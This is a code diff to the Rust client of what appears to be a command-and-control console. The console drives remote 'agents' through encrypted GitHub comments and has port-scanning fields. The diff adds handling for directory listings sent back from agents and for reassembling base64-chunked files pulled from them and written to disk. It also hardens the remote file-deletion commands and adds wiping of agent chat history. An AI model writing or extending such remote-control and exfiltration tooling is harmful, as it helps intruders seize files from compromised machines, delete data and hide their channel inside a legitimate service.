@@ -1,5 +1,19 @@
+use base64::Engine as _;
 use serde::{Deserialize, Serialize};
 use std::sync::{Arc, Mutex};
+
+#[derive(Deserialize)]
+struct FileEntry {
+    name: String,
+    is_dir: bool,
+    size: i64,
+}
+
+#[derive(Deserialize)]
+struct FileUploadPayload {
+    name: String,
+    data: String,
+}
 
 fn format_size(size: i64) -> String {
     if size < 1024 {
@@ -63,13 +77,13 @@ pub struct App {
     pub db: Arc<Mutex<rusqlite::Connection>>,
     pub last_poll: std::time::Instant,
     pub chunk_buffer: std::collections::HashMap<String, Vec<String>>,
+    pub chunk_part_map: std::collections::HashMap<String, String>,
     pub last_comment_time: Option<String>,
     pub pending_commands: std::collections::HashSet<String>,
     pub error_message: Option<String>,
     pub use_cmd: bool,
     pub use_interactive: bool,
     pub agent_cmd_prefs: std::collections::HashMap<String, bool>,
-    pub chunk_counter: usize,
     pub confirm_action: Option<(String, String)>,
     pub logs: Vec<String>,
     pub poll_interval: u64,
@@ -85,6 +99,22 @@ fn get_agent_os(agents: &[Agent], selected: Option<&String>) -> String {
 
 fn is_agent_windows(agents: &[Agent], selected: Option<&String>) -> bool {
     get_agent_os(agents, selected).contains("windows")
+}
+
+fn default_file_path_for_agent(agents: &[Agent], selected: Option<&String>) -> String {
+    if is_agent_windows(agents, selected) {
+        "DRIVES".to_string()
+    } else {
+        "/".to_string()
+    }
+}
+
+fn quote_powershell_literal_path(path: &str) -> String {
+    path.replace('\'', "''")
+}
+
+fn quote_posix_single(path: &str) -> String {
+    path.replace('\'', "'\"'\"'")
 }
 
 impl App {
@@ -126,24 +156,20 @@ impl App {
             current_tab: Tab::Settings,
             messages: Vec::new(),
             command_input: String::new(),
-            file_path: if cfg!(windows) {
-                "DRIVES".to_string()
-            } else {
-                "/".to_string()
-            },
+            file_path: "/".to_string(),
             file_list: Vec::new(),
             scan_host: String::new(),
             scan_ports: String::new(),
             db: db_arc,
             last_poll: std::time::Instant::now(),
             chunk_buffer: std::collections::HashMap::new(),
+            chunk_part_map: std::collections::HashMap::new(),
             last_comment_time: None,
             pending_commands: std::collections::HashSet::new(),
             error_message: None,
             use_cmd: false,
             use_interactive: false,
             agent_cmd_prefs: std::collections::HashMap::new(),
-            chunk_counter: 0,
             confirm_action: None,
             logs: Vec::new(),
             poll_interval,
@@ -734,7 +760,8 @@ impl App {
                 if let Ok(Some(path)) = crate::db::get_config(&conn, &key) {
                     self.file_path = path;
                 } else {
-                    self.file_path = "DRIVES".to_string();
+                    self.file_path =
+                        default_file_path_for_agent(&self.agents, self.selected_agent.as_ref());
                 }
             }
         }
@@ -836,9 +863,12 @@ impl App {
             name
         );
         let cmd = if is_win {
-            format!("Remove-Item -Force '{}'", path)
+            format!(
+                "Remove-Item -LiteralPath '{}' -Force",
+                quote_powershell_literal_path(&path)
+            )
         } else {
-            format!("rm -f '{}'", path)
+            format!("rm -f -- '{}'", quote_posix_single(&path))
         };
         self.send_command_direct(&cmd);
     }
@@ -918,6 +948,14 @@ impl App {
                             content: format!("[Decrypt Failed] {}", display_body),
                             is_command: false,
                         });
+
+                        if let Ok(conn) = self.db.lock() {
+                            let _ = crate::db::mark_comment_processed(
+                                &conn,
+                                agent_id,
+                                comment.id as i64,
+                            );
+                        }
                     }
                 }
 
@@ -931,8 +969,12 @@ impl App {
     fn process_response(&mut self, response: &str) {
         if response.starts_with("[Part ") {
             self.handle_chunk(response);
-        } else if response.starts_with("[FILES]") {
+        } else if response.starts_with("[FILES_JSON]") {
             self.parse_file_list(response);
+            self.pending_commands.clear();
+        } else if response.starts_with("[FILE_UPLOAD_JSON]") {
+            self.pending_commands.clear();
+            self.handle_uploaded_file(response);
         } else {
             self.pending_commands.clear();
             self.messages.push(Message {
@@ -947,19 +989,15 @@ impl App {
         if let Some(end) = chunk.find(']') {
             let header = &chunk[6..end];
             let parts: Vec<&str> = header.split('/').collect();
-            if parts.len() == 2 {
-                let current: usize = parts[0].parse().unwrap_or(0);
-                let total: usize = parts[1].parse().unwrap_or(0);
+            if parts.len() == 3 {
+                let response_id = parts[0].to_string();
+                let current: usize = parts[1].parse().unwrap_or(0);
+                let total: usize = parts[2].parse().unwrap_or(0);
                 let content = &chunk[end + 2..];
 
-                let key = if current == 1 {
-                    self.chunk_counter += 1;
-                    format!("chunk_{}_{}", self.chunk_counter, total)
-                } else {
-                    format!("chunk_{}_{}", self.chunk_counter, total)
-                };
-
                 if current > 0 && current <= total {
+                    let key = format!("chunk_{}_{}", response_id, total);
+                    self.chunk_part_map.insert(response_id.clone(), key.clone());
                     let chunks = self
                         .chunk_buffer
                         .entry(key.clone())
@@ -967,14 +1005,10 @@ impl App {
                     chunks[current - 1] = content.to_string();
 
                     if chunks.iter().all(|c| !c.is_empty()) {
-                        self.pending_commands.clear();
                         let full = chunks.join("");
-                        self.messages.push(Message {
-                            timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
-                            content: full,
-                            is_command: false,
-                        });
                         self.chunk_buffer.remove(&key);
+                        self.chunk_part_map.remove(&response_id);
+                        self.process_response(&full);
                     }
                 }
             }
@@ -984,25 +1018,88 @@ impl App {
     fn parse_file_list(&mut self, data: &str) {
         self.file_list.clear();
 
-        for line in data.lines().skip(1) {
-            let parts: Vec<&str> = line.split('|').collect();
-            if parts.len() == 3 {
-                let name = parts[0].to_string();
-                let is_dir = parts[1] == "DIR";
-                let size = parts[2].parse().unwrap_or(0);
+        let Some(payload) = data.strip_prefix("[FILES_JSON]\n") else {
+            return;
+        };
 
-                self.file_list.push(FileItem { name, is_dir, size });
-
-                if let (Some(agent_id), Ok(conn)) = (&self.selected_agent, self.db.lock()) {
+        if let Ok(entries) = serde_json::from_str::<Vec<FileEntry>>(payload) {
+            if let (Some(agent_id), Ok(conn)) = (&self.selected_agent, self.db.lock()) {
+                let _ = crate::db::clear_file_list(&conn, agent_id, &self.file_path);
+                for entry in &entries {
                     let _ = crate::db::save_file_list(
                         &conn,
                         agent_id,
                         &self.file_path,
-                        &parts[0],
-                        is_dir,
-                        size,
+                        &entry.name,
+                        entry.is_dir,
+                        entry.size,
                     );
                 }
+            }
+
+            for entry in entries {
+                self.file_list.push(FileItem {
+                    name: entry.name,
+                    is_dir: entry.is_dir,
+                    size: entry.size,
+                });
+            }
+        }
+    }
+
+    fn handle_uploaded_file(&mut self, response: &str) {
+        let Some(payload) = response.strip_prefix("[FILE_UPLOAD_JSON]\n") else {
+            return;
+        };
+
+        let file = match serde_json::from_str::<FileUploadPayload>(payload) {
+            Ok(file) => file,
+            Err(e) => {
+                self.error_message = Some(format!("Failed to parse file payload: {}", e));
+                return;
+            }
+        };
+
+        let data = if file.data.contains("[FILE_START]") {
+            let mut full_data = Vec::new();
+            for line in file.data.lines() {
+                if line == "[FILE_START]" || line == "[FILE_END]" || line.starts_with("[CHUNK_") {
+                    continue;
+                }
+                match base64::engine::general_purpose::STANDARD.decode(line) {
+                    Ok(chunk) => full_data.extend_from_slice(&chunk),
+                    Err(e) => {
+                        self.error_message = Some(format!("Failed to decode file chunk: {}", e));
+                        return;
+                    }
+                }
+            }
+            full_data
+        } else {
+            match base64::engine::general_purpose::STANDARD.decode(file.data.as_bytes()) {
+                Ok(data) => data,
+                Err(e) => {
+                    self.error_message = Some(format!("Failed to decode file: {}", e));
+                    return;
+                }
+            }
+        };
+
+        let save_dir = std::env::current_exe()
+            .ok()
+            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
+            .or_else(|| std::env::current_dir().ok())
+            .unwrap_or_else(|| std::path::PathBuf::from("."));
+        let save_path = save_dir.join(&file.name);
+
+        match std::fs::write(&save_path, data) {
+            Ok(_) => self.messages.push(Message {
+                timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
+                content: format!("[Downloaded] {}", save_path.display()),
+                is_command: false,
+            }),
+            Err(e) => {
+                self.error_message = Some(format!("Failed to save file: {}", e));
             }
         }
     }
@@ -1014,6 +1111,23 @@ impl App {
                 let repo = agent.repo.clone();
                 let client = crate::github::GitHubClient::new(self.github_token.clone(), repo);
                 let _ = client.clear_history(agent_id);
+
+                self.messages.clear();
+                self.pending_commands.clear();
+                self.chunk_buffer.clear();
+                self.chunk_part_map.clear();
+                self.last_comment_time = None;
+
+                if let Ok(conn) = self.db.lock() {
+                    let _ = conn.execute("DELETE FROM messages WHERE agent_id = ?1", [agent_id]);
+                    let _ = conn.execute(
+                        "DELETE FROM processed_comments WHERE agent_id = ?1",
+                        [agent_id],
+                    );
+                    let _ = conn.execute("DELETE FROM file_list WHERE agent_id = ?1", [agent_id]);
+                }
+
+                self.file_list.clear();
             }
         }
     }
